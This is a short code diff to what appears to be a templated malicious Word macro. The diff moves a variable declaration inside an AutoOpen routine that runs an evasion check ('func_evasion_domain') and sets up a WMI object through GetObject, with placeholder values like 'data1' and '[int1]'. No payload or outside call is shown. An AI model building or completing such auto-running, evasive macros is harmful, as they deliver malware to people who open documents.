@@ -39,7 +39,8 @@ Sub AutoOpen()
 	Dim var16 As Object
 	Dim var17 As Integer
 	Dim var18 As String
-
+	Dim var21 as String
+			
 	var21 = func_evasion_domain()
 	If (var21 = "bool1") Then
 	    var17 = [int1]
@@ -52,7 +53,6 @@ Sub AutoOpen()
 
 	    Dim var19 As String
 	    Dim var20 As String
-	    Dim var21 as String
 						
 	    var15 = init_wmi("data1")
 	    Set var16 = GetObject(var15)
